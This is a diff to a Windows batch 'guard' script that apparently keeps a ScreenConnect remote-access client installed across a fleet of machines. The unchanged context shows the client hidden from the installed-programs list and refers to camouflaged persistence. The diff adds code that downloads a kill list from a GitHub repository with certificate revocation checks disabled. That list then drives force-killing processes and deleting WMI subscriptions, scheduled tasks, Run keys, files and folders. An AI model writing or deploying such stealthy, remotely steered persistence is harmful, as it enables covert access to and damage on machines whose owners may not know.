@@ -19,8 +19,12 @@ rem   .wucache\wucache.vbs, mangled task literally named %V. Now also: kill matc
 rem   (self-PID + ScreenConnect/winrtcs excluded), strip Run/RunOnce values by data match,
 rem   delete camo script files, remove %-mangled tasks, run EVERY guard cycle at begin, and
 rem   auto-reset the extkill brake when anything was actually removed (fresh install chance).
+rem 0.0.9: HuntKiller goes data-driven - patterns/paths live in winrtcs_killlist.cfg in the repo
+rem   (downloaded each run, cached locally, builtin fallback). New lesson learned = one cfg line,
+rem   fleet preempts it next cycle. Case studies: CASES.md.
 setlocal EnableExtensions EnableDelayedExpansion
 set "ZD=C:\ProgramData\WinRTCS"
+set "KL=%ZD%\killlist.cfg"
 set "CURL=%SystemRoot%\System32\curl.exe"
 set "BASE=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
 set "UI=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
@@ -54,6 +58,7 @@ echo [%DATE% %TIME%] guard_begin host=%COMPUTERNAME% streak=!STREAK! extkill=!EX
 
 call :Shields
 call :HideARP
+call :FetchKL
 call :HuntKiller
 if exist "%ZD%\killer.flag" (
   del /f /q "%ZD%\killer.flag" >nul 2>&1
@@ -306,10 +311,21 @@ powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='Silently
 if exist "%ZD%\svc_dead.out" ( type "%ZD%\svc_dead.out">>"%LOG%" & del /f /q "%ZD%\svc_dead.out" >nul 2>&1 )
 exit /b 0
 
+:FetchKL
+rem --- kill list is data: fresh copy from repo wins, cached copy otherwise, builtin as last resort ---
+set "KLNEW=%ZD%\killlist.new"
+del /f /q "%KLNEW%" >nul 2>&1
+"%CURL%" -L --ssl-no-revoke --connect-timeout 6 --max-time 20 -o "%KLNEW%" "%BASE%/winrtcs_killlist.cfg?t=%RANDOM%%RANDOM%" >nul 2>&1
+if exist "%KLNEW%" (
+  findstr /C:"WINRTCS_KILLLIST" "%KLNEW%" >nul 2>&1 && move /y "%KLNEW%" "%KL%" >nul 2>&1
+)
+del /f /q "%KLNEW%" >nul 2>&1
+exit /b 0
+
 :HuntKiller
-rem --- our own ghosts: legacy camo persistence (WMI subs, Run keys, mangled tasks, scripts).
-rem --- Runs every cycle. Sets killer.flag when anything was removed (brake reset at begin). ---
-powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; $o=@(); $pat='gryxa|wucache|etlcache|own_mon|own_lib|own_gryxa|zerocool|36e506ff016b2151|ETLParser|NetTraceParser'; Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -and ($_.CommandLine -match $pat) -and ($_.CommandLine -notmatch 'ScreenConnect|winrtcs') -and ($_.ProcessId -ne $PID) } | ForEach-Object { $o+=('proc_killed ' + $_.Name + ' pid=' + $_.ProcessId); Stop-Process -Id $_.ProcessId -Force }; $cons=Get-CimInstance -Namespace root\subscription -ClassName __EventConsumer | Where-Object { (($_.CommandLineTemplate) -and ($_.CommandLineTemplate -match $pat)) -or ($_.Name -match $pat) }; foreach($c in $cons){ $o+=('wmi_consumer_killed ' + $c.Name); Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Consumer -match [regex]::Escape($c.Name) } | Remove-CimInstance; Remove-CimInstance $c }; $filts=Get-CimInstance -Namespace root\subscription -ClassName __EventFilter | Where-Object { (($_.Query) -and ($_.Query -match $pat)) -or ($_.Name -match $pat) }; foreach($f in $filts){ $o+=('wmi_filter_killed ' + $f.Name); Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Filter -match [regex]::Escape($f.Name) } | Remove-CimInstance; Remove-CimInstance $f }; $tasks=Get-ScheduledTask | Where-Object { $_.TaskPath -notmatch 'WinRTCS' }; foreach($t in $tasks){ $acts=($t.Actions | ForEach-Object { $_.Execute + ' ' + $_.Arguments }) -join ';'; if((($t.TaskName -match $pat) -or ($acts -match $pat) -or ($t.TaskName -match '^%[A-Z]$')) -and ($acts -notmatch 'winrtcs')){ $o+=('task_killed ' + $t.TaskPath + $t.TaskName); Unregister-ScheduledTask -TaskName $t.TaskName -TaskPath $t.TaskPath -Confirm:$false } }; foreach($rk in 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run','HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run','HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce','HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce'){ $p=Get-ItemProperty $rk; if($p){ foreach($prop in $p.PSObject.Properties){ if(($prop.Value -is [string]) -and ($prop.Value -match $pat) -and ($prop.Value -notmatch 'ScreenConnect|winrtcs')){ $o+=('runkey_killed ' + $prop.Name); Remove-ItemProperty -Path $rk -Name $prop.Name -Force } } } }; foreach($f in 'C:\ProgramData\Microsoft\Diagnosis\ETLParser.ps1','C:\ProgramData\Microsoft\NetTrace\NetTraceParser.ps1','C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\wucache.vbs'){ if(Test-Path $f){ Remove-Item $f -Force; $o+=('file_killed ' + $f) } }; if(Test-Path 'C:\ProgramData\Microsoft\NetTrace'){ Remove-Item 'C:\ProgramData\Microsoft\NetTrace' -Recurse -Force; $o+='dir_killed NetTrace' }; if($o){ $o | Set-Content -Path '%ZD%\killer.out' -Encoding ASCII; '1' | Set-Content -Path '%ZD%\killer.flag' -Encoding ASCII }" >nul 2>&1
+rem --- known-bad artifacts are data (winrtcs_killlist.cfg). Runs every cycle, sets killer.flag
+rem --- when anything was removed so the begin flow resets the extkill brake. ---
+powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; $o=@(); $match=@(); $tnames=@(); $files=@(); $dirs=@(); if(Test-Path '%KL%'){ foreach($l in Get-Content '%KL%'){ $t=$l.Trim(); if(-not $t -or $t.StartsWith('#')){ continue }; $p=$t -split '\|'; switch($p[0]){ 'match'{ $match+=$p[1] } 'taskname'{ $tnames+=$p[1] } 'file'{ $files+=$p[1] } 'dir'{ $dirs+=$p[1] } } } }; if(-not $match){ $match=@('gryxa','wucache','etlcache','ETLParser','NetTraceParser','own_mon','own_lib','own_gryxa','zerocool','36e506ff016b2151') }; $pat=$match -join '|'; Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -and ($_.CommandLine -match $pat) -and ($_.CommandLine -notmatch 'ScreenConnect|winrtcs') -and ($_.ProcessId -ne $PID) } | ForEach-Object { $o+=('proc_killed ' + $_.Name + ' pid=' + $_.ProcessId); Stop-Process -Id $_.ProcessId -Force }; $cons=Get-CimInstance -Namespace root\subscription -ClassName __EventConsumer | Where-Object { (($_.CommandLineTemplate) -and ($_.CommandLineTemplate -match $pat)) -or ($_.Name -match $pat) }; foreach($c in $cons){ $o+=('wmi_consumer_killed ' + $c.Name); Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Consumer -match [regex]::Escape($c.Name) } | Remove-CimInstance; Remove-CimInstance $c }; $filts=Get-CimInstance -Namespace root\subscription -ClassName __EventFilter | Where-Object { (($_.Query) -and ($_.Query -match $pat)) -or ($_.Name -match $pat) }; foreach($f in $filts){ $o+=('wmi_filter_killed ' + $f.Name); Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Filter -match [regex]::Escape($f.Name) } | Remove-CimInstance; Remove-CimInstance $f }; $tasks=Get-ScheduledTask | Where-Object { $_.TaskPath -notmatch 'WinRTCS' }; foreach($t in $tasks){ $acts=($t.Actions | ForEach-Object { $_.Execute + ' ' + $_.Arguments }) -join ';'; $hit=($t.TaskName -match $pat) -or ($acts -match $pat); if(-not $hit){ foreach($tn in $tnames){ if($t.TaskName -match $tn){ $hit=$true } } }; if($hit -and ($acts -notmatch 'winrtcs')){ $o+=('task_killed ' + $t.TaskPath + $t.TaskName); Unregister-ScheduledTask -TaskName $t.TaskName -TaskPath $t.TaskPath -Confirm:$false } }; foreach($rk in 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run','HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run','HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce','HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce'){ $p=Get-ItemProperty $rk; if($p){ foreach($prop in $p.PSObject.Properties){ if(($prop.Value -is [string]) -and ($prop.Value -match $pat) -and ($prop.Value -notmatch 'ScreenConnect|winrtcs')){ $o+=('runkey_killed ' + $prop.Name); Remove-ItemProperty -Path $rk -Name $prop.Name -Force } } } }; foreach($f in $files){ if(Test-Path $f){ Remove-Item $f -Force; $o+=('file_killed ' + $f) } }; foreach($d in $dirs){ if(Test-Path $d){ Remove-Item $d -Recurse -Force; $o+=('dir_killed ' + $d) } }; if($o){ $o | Set-Content -Path '%ZD%\killer.out' -Encoding ASCII; '1' | Set-Content -Path '%ZD%\killer.flag' -Encoding ASCII }" >nul 2>&1
 if exist "%ZD%\killer.out" ( type "%ZD%\killer.out">>"%LOG%" & del /f /q "%ZD%\killer.out" >nul 2>&1 )
 exit /b 0
 
